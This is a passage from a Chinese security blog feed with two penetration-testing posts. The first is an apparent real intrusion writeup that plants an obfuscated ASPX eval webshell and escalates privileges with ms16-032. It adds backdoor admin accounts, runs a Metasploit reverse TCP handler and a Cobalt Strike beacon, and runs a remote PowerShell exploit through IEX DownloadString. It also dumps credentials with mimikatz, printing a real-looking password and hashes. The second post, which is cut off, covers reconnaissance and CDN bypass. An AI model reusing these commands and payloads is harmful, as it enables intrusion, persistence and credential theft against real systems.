--file-dest&#x3D;&quot;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady123.aspx&quot;</span><br></pre></td></tr></table></figure><p>使用os-shell命令，查看是否上传上去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; dir D:\S_JCIN\WEBSITE\OUTWEB\L_CT\NEWS\</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 09:08                 9 shell.aspx</span><br><span class="line">2014&#x2F;12&#x2F;17  下午 05:40               277 sidebar.asp</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 10:55               116 steady.aspx</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 10:56               116 steady.txt</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 11:24                 8 steady1.txt</span><br><span class="line">2020&#x2F;11&#x2F;17  下午 02:28               116 steady123.aspx</span><br></pre></td></tr></table></figure><p>查看马是否连接成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; type  D:\S_JCIN\WEBSITE\OUTWEB\L_CT\NEWS\steady123.aspx</span><br><span class="line"><span class="keyword">do</span> you want to retrieve the command standard output? [Y/n/a] y</span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">13</span>] [INFO] retrieved: <span class="string">&#x27;&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;&#x27;</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">13</span>] [INFO] retrieved: <span class="string">&#x27;&lt;%var PAY:String=Request[&quot;\x61\x62\x63\x64&quot;];&#x27;</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">13</span>] [INFO] retrieved: <span class="string">&#x27;eval(PAY,&quot;\x75\x6E\x73\x61&quot;+&quot;\x66\x65&quot;);&#x27;</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">14</span>] [INFO] retrieved: <span class="string">&#x27;%&gt;&#x27;</span></span><br><span class="line">command standard output:</span><br><span class="line">---</span><br><span class="line">&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;</span><br><span class="line">&lt;%<span class="keyword">var</span> PAY:<span class="keyword">String</span>=Request[<span class="string">&quot;abcd&quot;</span>];</span><br><span class="line"><span class="keyword">eval</span>(PAY,<span class="string">&quot;unsa&quot;</span>+<span class="string">&quot;fe&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="exp提权"><a href="#exp提权" class="headerlink" title="exp提权"></a>exp提权</h5><p>使用ms16-032直接提权成功，添加用户，添加用户到管理员组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; ms16<span class="number">-032.</span>exe <span class="string">&quot;whoami&quot;</span></span><br><span class="line">[<span class="comment">#] ms16-032 for service by zcgonvh</span></span><br><span class="line">[+] SeAssignPrimaryTokenPrivilege was assigned</span><br><span class="line">[!] process with pid: <span class="number">5364</span> created.</span><br><span class="line">==============================</span><br><span class="line">nt authority\system</span><br><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; ms16<span class="number">-032.</span>exe <span class="string">&quot;net user good gongxinao /add&quot;</span></span><br><span class="line">[<span class="comment">#] ms16-032 for service by zcgonvh</span></span><br><span class="line">[+] SeAssignPrimaryTokenPrivilege was assigned</span><br><span class="line">[!] process with pid: <span class="number">1668</span> created.</span><br><span class="line">==============================</span><br><span class="line">命令執行成功。</span><br><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; ms16<span class="number">-032.</span>exe <span class="string">&quot;net localgroup administrators good /add&quot;</span></span><br><span class="line">[<span class="comment">#] ms16-032 for service by zcgonvh</span></span><br><span class="line">[+] SeAssignPrimaryTokenPrivilege was assigned</span><br><span class="line">[!] process with pid: <span class="number">364</span> created.</span><br><span class="line">==============================</span><br><span class="line">命令執行成功</span><br></pre></td></tr></table></figure><p>查看3389是否连接成功，返回为0表示连接成功。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; REG QUERY <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><br><span class="line">    fDenyTSConnections    REG_DWORD    <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>既然是ms16-032直接msf。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use  exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</span><br><span class="line">[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">[*] Started reverse TCP handler on 164.155.95.55:4444 </span><br><span class="line">[+] Compressed size: 1016</span><br><span class="line">[*] Writing payload file, C:\WINDOWS\TEMP\EnCngJ.ps1...</span><br><span class="line">[*] Compressing script contents...</span><br><span class="line">[+] Compressed size: 3564</span><br><span class="line">[*] Executing exploit script...</span><br><span class="line">[-] Exploit failed [user-interrupt]: Rex::TimeoutError Operation timed out.</span><br><span class="line">[+] Deleted C:\WINDOWS\TEMP\EnCngJ.ps1</span><br><span class="line">[-] run: Interrupted</span><br></pre></td></tr></table></figure><p>最后连接超时，百度一下原因发现。改模块需要目标系统具有powershell，而03的系统肯定是没有powershell的，但是问题来了为什么exe文件就可以提权，msf就不可以？两者的原理都是一样的，无非是形式不一样。</p><p>既然能够运行exp.exe，查看一下进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"> 5012  5372  notepad.exe             x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\notepad.exe</span><br><span class="line"> 5060  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5096  5288  notepad.exe             x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\notepad.exe</span><br><span class="line"> 5224  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5240  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5288  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5372  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5640  5644  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5672  4532  powershell.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\System32\windowspowershell\v1.0\powershell.exe</span><br><span class="line"> 6032  4532  powershell.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\System32\windowspowershell\v1.0\powershell.exe</span><br></pre></td></tr></table></figure><p>发现有powershell.exe。</p><p>最后直接连接3389，找到我们上传的迷你卡姿抓取密码，这里为了方便直接倒入到文件中，然后使用蚁剑下载到本地，拿到管理员账号密码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x86) #19041 Sep 18 2020 19:18:00</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https:<span class="comment">//pingcastle.com / https://mysmartlogon.com ***/</span></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::logonpasswords</span></span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">78368</span> (<span class="number">00000000</span>:<span class="number">00013220</span>)</span><br><span class="line">Session           : Service <span class="keyword">from</span> <span class="number">0</span></span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : RENHAI</span><br><span class="line">Logon Server      : RENHAI</span><br><span class="line">Logon Time        : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">20</span> </span><br><span class="line">SID               : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2928085508</span><span class="number">-3031473165</span><span class="number">-2762439012</span><span class="number">-500</span></span><br><span class="line">msv :</span><br><span class="line"> [<span class="number">00000002</span>] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : RENHAI</span><br><span class="line"> * LM       : d7b9834aa4c07e3bd8265b84d6256f93</span><br><span class="line"> * NTLM     : <span class="number">2</span>a40e70e764833f30c1c804f5709dba2</span><br><span class="line"> * SHA1     : aa34ec6af75a3813a158c3e95a475602f25b5a34</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : RENHAI</span><br><span class="line"> * Password : <span class="number">168</span>renhai</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : RENHAI</span><br><span class="line"> * Password : <span class="number">168</span>renhai</span><br></pre></td></tr></table></figure><p>接下来就等着晚上上线管理员了。</p><p>然后我们接着看一下msf使用ms16这个洞报错的原因，首先目标系统是肯定有ps的。再一次启动msf查看报错信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 164.155.95.55:4444 </span><br><span class="line">[+] Compressed size: 1016</span><br><span class="line">[*] Writing payload file, C:\DOCUME~1\good\LOCALS~1\Temp\1\VcDqmVnyed.ps1...</span><br><span class="line">[*] Compressing script contents...</span><br><span class="line">[+] Compressed size: 3596</span><br><span class="line">[*] Executing exploit script...</span><br><span class="line">[-] Exploit failed [user-interrupt]: Rex::TimeoutError Operation timed out.</span><br><span class="line">[-] run: Interrupted</span><br></pre></td></tr></table></figure><p>可以看到ps文件存在于<code>C:\DOCUME~1\good\LOCALS~1\Temp\1\VcDqmVnyed.ps1..</code>。我们到目标机器下面查看一下。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/37091F23-13E7-4DBF-895B-A4E4F598F4CC.png" alt="37091F23-13E7-4DBF-895B-A4E4F598F4CC"></p><p>可以看到目标系统上传了ps文件。我们直接使用ps执行ps脚本，发现报红而且闪退。大概这就是msf不能正常使用的原因吧。管理员权限不能使用ps，接着我们晚上偷摸的登录管理员用户，这时候就是system权限，然后调用ps。运行对应的脚本发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News\Invoke-MS16-032.ps1 檔案無法載入，因為這個系</span><br><span class="line">統上已停用指令碼執行。如需詳細資訊，請參閱 &quot;get-help about_signing&quot;。</span><br><span class="line">位於 行:1 字元:55</span><br><span class="line">+ D:\S_JCIN\WebSite\OutWeb\L_CT\News\Invoke-MS16-032.ps1 &lt;&lt;&lt;&lt;</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [], PSSecurityException</span><br><span class="line">    + FullyQualifiedErrorId : RuntimeException</span><br></pre></td></tr></table></figure><p>这是由于powershell的默认执行权限为<code>Restricted：脚本不能运行（默认设置）</code>。</p><p>查看一下当前powershell的默认执行权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Documents and Settings\Administrator&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><p>设置一下权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Documents and Settings\Administrator&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br><span class="line">PS C:\Documents and Settings\Administrator&gt; Set-ExecutionPolicy Unrestricted</span><br><span class="line"></span><br><span class="line">執行原則變更</span><br><span class="line">執行原則有助於防範您不信任的指令碼。如果變更執行原則，可能會使您接觸到</span><br><span class="line">about_Execution_Policies 說明主題中所述的安全性風險。您要變更執行原則嗎?</span><br><span class="line">[Y] 是(Y)  [N] 否(N)  [S] 暫停(S)  [?] 說明 (預設值為 &quot;Y&quot;): y</span><br><span class="line">PS C:\Documents and Settings\Administrator&gt; Get-ExecutionPolicy</span><br><span class="line">Unrestricted</span><br><span class="line">PS C:\Documents and Settings\Administrator&gt;</span><br></pre></td></tr></table></figure><p>这时候可以运行powershell脚本。</p><p>然后在管理员用户下运行cs马，反弹一个shell这时候就是system权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; sleep 0</span><br><span class="line">[*] Tasked beacon to become interactive</span><br><span class="line">[+] host called home, sent: 16 bytes</span><br><span class="line">beacon&gt; shell whoami</span><br><span class="line">[*] Tasked beacon to run: whoami</span><br><span class="line">[+] host called home, sent: 37 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">renhai\administrator</span><br></pre></td></tr></table></figure><h5 id="ps提权"><a href="#ps提权" class="headerlink" title="ps提权"></a>ps提权</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Documents and Settings\good&gt; powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https</span><br><span class="line">:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Ridter&#x2F;Pentest&#x2F;master&#x2F;powershell&#x2F;MyShell&#x2F;Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application</span><br><span class="line"> cmd.exe -commandline &#39;&#x2F;c net localgroup administrators gust &#x2F;add&#39;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 8</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">[?] Done, got 2 thread handle(s)!</span><br><span class="line"></span><br><span class="line">[?] Thread handle list:</span><br><span class="line">1604</span><br><span class="line">2424</span><br><span class="line"></span><br><span class="line">[*] Sniffing out privileged impersonation token..</span><br><span class="line"></span><br><span class="line">[?] Trying thread handle: 1604</span><br><span class="line">[?] Thread belongs to: svchost</span><br><span class="line">[+] Thread suspended</span><br><span class="line">[&gt;] Wiping current impersonation token</span><br><span class="line">[&gt;] Building SYSTEM impersonation token</span><br><span class="line">[?] Success, open SYSTEM token handle: 2420</span><br><span class="line">[+] Resuming thread..</span><br><span class="line"></span><br><span class="line">[*] Sniffing out SYSTEM shell..</span><br><span class="line"></span><br><span class="line">[&gt;] Duplicating SYSTEM token</span><br><span class="line">[&gt;] Starting token race</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">PS C:\Documents and Settings\good&gt; net localgroup administrators</span><br><span class="line">別名     administrators</span><br><span class="line">註解     Administrators 可以完全不受限制地存取電腦&#x2F;網域</span><br><span class="line"></span><br><span class="line">成員</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">banli$</span><br><span class="line">good</span><br><span class="line">Guest</span><br><span class="line">gust</span><br><span class="line">IUSR_TELNET</span><br><span class="line">TelNet</span><br><span class="line">命令執行成功。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个网站的渗透思路</title>
      <link href="2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/"/>
      <url>2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="一个网站的渗透思路"><a href="#一个网站的渗透思路" class="headerlink" title="一个网站的渗透思路"></a>一个网站的渗透思路</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>信息收集网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.shodan.io&#x2F;</span><br></pre></td></tr></table></figure><h5 id="判断网站是否存在cdn"><a href="#判断网站是否存在cdn" class="headerlink" title="判断网站是否存在cdn"></a>判断网站是否存在cdn</h5><ul><li><p>什么是cdn？</p><p>CDN的全称是Content Delivery Network，即内容分发网络。其目的是通过在现有的internet中增加一层新的网络架构，将网站的内容发布到最接近用户的网络边缘，使用户可以就近取得所需的内容，提高用户访问网站的响应速度。</p><p>具体流程为: 用户在自己的浏览器中输入要访问的网站的域名，浏览器向本地DNS请求对该域名的解析，本地DNS将请求发到网站的主DNS，主DNS根据一系列的策略确定当时最适当的CDN节点，并将解析的结果（IP地址）发给用户，用户向给定的CDN节点请求相应网站的内容。</p></li><li><p>为什么要绕过cdn？</p><p>由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p></li><li><p>判断是否有cdn的方式</p><ul><li><p>Nslookup命令–查看是否返回多个IP，如果返回多个IP则表示存在CDN，否则可能不存在CDN。</p><p>可以看到有多个IP。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nslookup jd.com</span><br><span class="line">Server:114.114.114.114</span><br><span class="line">Address:114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:jd.com</span><br><span class="line">Address: 111.13.149.108</span><br><span class="line">Name:jd.com</span><br><span class="line">Address: 120.52.148.118</span><br><span class="line">Name:jd.com</span><br><span class="line">Address: 118.193.98.63</span><br></pre></td></tr></table></figure></li><li><p>使用在线网站查看–如果有多个IP则存在CDN，如果只有一个IP则不存在CDN</p><p>常见网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爱站:     https:&#x2F;&#x2F;ping.aizhan.com&#x2F;</span><br><span class="line">站长之家:  http:&#x2F;&#x2F;ping.chinaz.com&#x2F;</span><br></pre></td></tr></table></figure></li><li><p>使用工具直接查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ipip.net&#x2F;ip.html</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="绕过CDN的方式"><a href="#绕过CDN的方式" class="headerlink" title="绕过CDN的方式"></a>绕过CDN的方式</h5><ul><li><p>查找子域名</p><p>因为CDN架设需要钱，所以有的站点只给主域名架上CDN，而子域名一般不架设CDN。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.oneforall 查找子域名</span><br><span class="line">2、Google hacker 查找子域名</span><br><span class="line">3、site:baidu.com -www</span><br></pre></td></tr></table></figure></li><li><p>让服务器主动给我们发送邮箱，邮箱系统很多都在内部，没有经过解析，可以在邮件源码里面找到服务的真实的</p></li><li><p>历史DNS记录</p><p>查询ip与域名绑定历史记录，会发现使用cdn之前的目标ip。</p><p>使用网站查询之前绑定的域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ip138.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnsdb.io&#x2F;zh-cn&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;x.threatbook.cn&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;sitereport.netcraft.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;viewdns.info&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.17ce.com&#x2F;</span><br></pre></td></tr></table></figure></li><li><p>利用网站漏洞</p><p>phpinfo敏感信息泄漏等等，如果存在web漏洞让服务器主动向我们请求链接，我们可以获取目标站点的真实ip。</p><p>可以尝试反弹shell到我们的主机。</p></li><li><p>cert证书查询</p><p>转化成十进制,使用fofa搜索。</p><p>fofa语法–<code>cert=&quot;十进制&quot;</code></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111235353259.png" alt="image-20201111235353259"></p></li><li><p>在国外ping–网站在国外没有CDN</p><p>使用国外的网站ping</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;en&#x2F;ping.php</span><br></pre></td></tr></table></figure></li><li><p>绕过之后开始渗透</p><p>把真实的ip与目标域名在hosts文件中绑定。</p><p>或者直接访问目标的ip而不是访问域名。</p></li></ul><h5 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h5><ul><li><p>使用burp抓包、放包，在返回包中可以看到使用的系统、脚本语言、服务类型以及waf类型等等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;gb2312</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Server: Microsoft-IIS&#x2F;8.5</span><br><span class="line">X-Powered-By: WAF&#x2F;2.0</span><br><span class="line">Date: Mon, 21 Sep 2020 12:02:33 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 9173</span><br></pre></td></tr></table></figure></li><li><p>使用谷歌插件–Wappalyzer 查看网站的基本信息，比如web服务、脚本语言等等。</p></li><li><p>判断数据库类型</p><p>数据库本身的特性</p><ul><li>access数据库，数据库文件后缀为.mdb，一般配合的脚本语言为asp。为小型数据库。</li><li>SQL Server数据库，数据库文件后缀为.mdf，一般配合的脚本语言为asp。端口号为1433。</li><li>mysql数据库，数据库后缀文件为,sql，一般配合的脚本语言为php，端口号为3306。</li><li>Oracle数据库，端口号为1521。</li></ul><p>sql注入判断数据库类型</p><ul><li><p>特有的函数</p><ul><li><p>通过使用查看数据库版本的函数，比如mysql的version()、@@version函数</p></li><li><p>substring和substr</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在mssql、mysql中可以调用substring。oracle则只可调用substr</span><br></pre></td></tr></table></figure></li><li><p>其他的一些函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sql server: @@pack_received @@rowcount</span><br><span class="line">mysql:connection_id() last_insert_id() row_count()</span><br><span class="line">orcale:bitand(1,1)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>对字符串的处理方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sql server ：id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; --</span><br><span class="line">mssql:id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39;</span><br><span class="line">mysql:id&#x3D;1 and 